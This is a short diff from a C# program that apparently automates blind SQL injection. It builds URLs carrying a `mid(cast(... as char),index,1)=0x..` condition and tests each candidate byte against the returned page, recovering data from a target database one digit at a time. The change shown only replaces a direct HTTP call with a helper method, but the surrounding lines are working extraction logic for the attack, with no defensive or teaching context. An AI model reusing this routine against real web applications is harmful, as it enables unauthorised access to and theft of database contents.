@@ -37,7 +37,7 @@ public class Test
 			//現在の桁の数字を取得
 			for(int i = 0x30; i < 0x40; i++){
 				test_url = CraftURL(url, query_format, $"mid(cast({target_query} as char),{index},1)=0x" + i.ToString("X2"));
-				html = await client.GetStringAsync(test_url);
+				html = await _get_html(test_url);
 				if(check_func(html)){
 					result_s += (char)i;
 					break;
